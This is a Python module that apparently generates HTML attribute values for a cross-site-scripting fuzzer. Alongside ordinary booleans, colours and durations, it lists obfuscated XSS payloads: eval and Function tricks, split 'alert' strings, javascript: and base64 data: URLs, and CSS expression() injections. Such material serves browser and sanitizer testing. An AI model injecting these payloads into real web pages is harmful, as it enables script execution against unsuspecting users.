from utils import choice, rndstr


def gen_text():
    return rndstr(8)


def gen_boolean():
    cases = {
        0: lambda: 'yes',
        1: lambda: 'no',
        2: lambda: 'true',
        3: lambda: 'false',
        4: lambda: 'null',
        5: lambda: 'undefined',
        6: lambda: '',
        7: lambda: '0',
        8: lambda: '1',
    }

    return choice(cases)()


def gen_number():
    cases = {
        0: lambda: '0',
        1: lambda: '1',
        2: lambda: '2',
        3: lambda: '3',
    }

    return choice(cases)()


def gen_color():
    cases = {
        0: lambda: '#000000',
        1: lambda: '#ffffff',
        2: lambda: '#ff0000',
        3: lambda: '#00ff00',
        4: lambda: '#0000ff',
        5: lambda: '#ffff00',
        6: lambda: '#00ffff',
        7: lambda: '#ff00ff',
        8: lambda: '#c0c0c0',
    }

    return choice(cases)()


def gen_javascript():
    cases = {
        0: lambda: 'alert(0)',
        1: lambda: 'prompt`0`',
        2: lambda: 'confirm`0`',
        3: lambda: "window['alert'](0)",
        4: lambda: "window['prompt'](0)",
        5: lambda: "window['confirm'](0)",
        6: lambda: 'eval.call`${String.fromCharCode(97,108,101,114,116,40,49,41)}`',
        7: lambda: 'Function(`a${`lert\`1\``}`).call``',
        8: lambda: "window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//",
        9: lambda: "eval.call`${'alert\x2823\x29'}`",
        10: lambda: '[].sort.call`${alert}23`',
        11: lambda: '{1:alert(1)}',
        12: lambda: '(()=>{alert`1`})()',
        13: lambda: 'x=alert;x(1);',
    }

    return choice(cases)()


def gen_style():
    # xss via style
    cases = {
        0: lambda: 'background-image:url("javascript:alert(1)")',
        1: lambda: 'expression(alert(1))',
        2: lambda: 'expression\x600\x60',
        3: lambda: 'animation-name:x;animation-duration:0s;',
        4: lambda: '@keyframes x{}'
    }

    return choice(cases)()


def gen_url():
    # xss via url
    cases = {
        0: lambda: 'javascript:alert(1)',
        1: lambda: 'data:text/html,<script>alert(1)</script>',
        2: lambda: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        3: lambda: 'data:text/html,<script>alert\x600\x60</script>',
    }

    return choice(cases)()


def gen_email():
    # xss via email
    cases = {
        0: lambda: '@javascript:alert(1)',
        1: lambda: 'javascript:alert(1)@',
        2: lambda: '@javascript:alert\x600\x60',
    }

    return choice(cases)()


def gen_date():
    return '2020-01-01'


def gen_target(tag):
    if tag is None:
        return ""
    return choice(tag.ids)


def gen_name(tag):
    if tag is None:
        return ""
    return choice(tag.names)


def gen_flag():
    return None


def gen_drop():
    return choice(["copy", "move", "link"])


def gen_dir():
    return choice(["ltr", "rtl", "auto"])


def gen_wtarget():
    return choice(["_self", "_blank", "_parent", "_top"])


def gen_access_key():
    return 'X'


def gen_duration():
    return choice(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]) + choice(["s", "ms"])
